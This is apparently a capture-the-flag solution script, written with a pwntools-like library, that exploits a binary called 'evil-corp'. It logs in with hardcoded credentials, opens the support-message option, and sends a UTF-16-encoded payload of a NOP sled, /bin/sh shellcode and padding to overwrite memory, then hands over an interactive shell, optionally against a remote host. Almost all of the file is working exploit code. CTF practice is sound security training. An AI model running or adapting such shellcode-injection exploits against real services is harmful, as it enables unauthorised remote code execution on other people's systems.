#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./evil-corp', checksec=False)
context.arch = 'amd64'
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''
        b*ContactSupport+60
        b*ContactSupport+110
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

p = start()

# ==================== EXPLOIT ====================

def login():
    sla(b'Username: ', b'eliot')
    sla(b'Password: ', b'4007')


def choice(option):
    sla(b'>> ', f'{option}'.encode())


def shellcode():

    # Using https://unicode-explorer.com/
    supportmsg   = '𐀀'    
    assemblytestpage = '𑀀' 

    # Using pwntools functions
    nop = b'\x90\x00'.decode('utf-16-le') 
    null = '\x00'

    shellcode =  asm(shellcraft.sh()).decode('utf-16')

    # Padding is 0x3e88 / 4 = 0xfa2
    payload = nop * 0x800
    payload += shellcode
    payload = payload.ljust(0xfa2, null)
    payload += assemblytestpage + null
    # payload += nop * 2

    return payload


def exploit():

    login()
    choice(2)

    payload = shellcode()

    msg = '信息'.encode('utf-8') +b'\x0a' +b'\x0a'

    sla(msg, payload)

    interactive()

if __name__ == '__main__':
  exploit()
